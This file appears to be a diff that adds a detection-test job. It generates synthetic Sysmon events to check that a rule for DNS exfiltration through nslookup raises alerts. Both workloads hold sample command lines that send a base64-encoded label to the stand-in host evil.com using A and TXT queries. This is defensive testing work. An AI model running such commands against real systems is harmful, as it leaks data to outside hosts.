@@ -1,0 +1,51 @@
+type: job
+detection:
+  source: escu
+  name: "DNS Exfiltration Using Nslookup App"
+  id: 2452e632-9e0d-11eb-bacd-acde48001122
+description: |
+  Validates DNS exfiltration through nslookup (T1048.003) via Sysmon EID 1
+  process-create events. Fires the Endpoint.Processes command-line detection on two
+  query-type branches: an A-record lookup with `-type`/`-retry`, and a TXT query-type
+  lookup.
+mitre:
+  tactics: [exfiltration]
+  techniques: [T1048.003]
+
+state:
+  domain_short:        CORP
+  domain_tld:          local
+  domain_short_lower:  fn.lower(ref.domain_short)
+  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
+  username:            gen.username()
+  user:                "${ref.domain_short}\\${ref.username}"
+  encoded_label:       VXNlck5hbWU6IEd1ZXN0
+  exfil_domain:        evil.com
+
+workloads:
+  - scenario: scenarios/windows/sysmon/process-create/dns-exfiltration-nslookup
+    bindings:
+      domain_short:  ref.domain_short
+      domain_tld:    ref.domain_tld
+      computer:      ref.computer
+      username:      ref.username
+      user:          ref.user
+      command_line:  "nslookup.exe  -timeout=5 -retry=3 -type=A ${ref.encoded_label} ${ref.exfil_domain}"
+      parent_command_line: '"C:\Windows\system32\cmd.exe" /c nslookup.exe -timeout=5 -retry=3 -type=A ${ref.encoded_label} ${ref.exfil_domain} > C:\Users\${ref.username}\AppData\Local\Temp\2\nlbfcqrg.tmp 2>&1'
+    expectation:
+      expected: alert
+      summary: "nslookup A-record lookup with -type and -retry flags carrying an encoded label fires the DNS-exfiltration command-line detection"
+
+  - scenario: scenarios/windows/sysmon/process-create/dns-exfiltration-nslookup
+    bindings:
+      domain_short:  ref.domain_short
+      domain_tld:    ref.domain_tld
+      computer:      ref.computer
+      username:      ref.username
+      user:          ref.user
+      command_line:  "nslookup.exe  -querytype=txt ${ref.encoded_label} ${ref.exfil_domain}"
+      parent_command_line: '"C:\Windows\system32\cmd.exe" /c nslookup.exe -querytype=txt ${ref.encoded_label} ${ref.exfil_domain} > C:\Users\${ref.username}\AppData\Local\Temp\2\nlqtxt.tmp 2>&1'
+    expectation:
+      expected: alert
+      summary: "nslookup TXT query-type lookup carrying an encoded label fires via the -querytype match path"
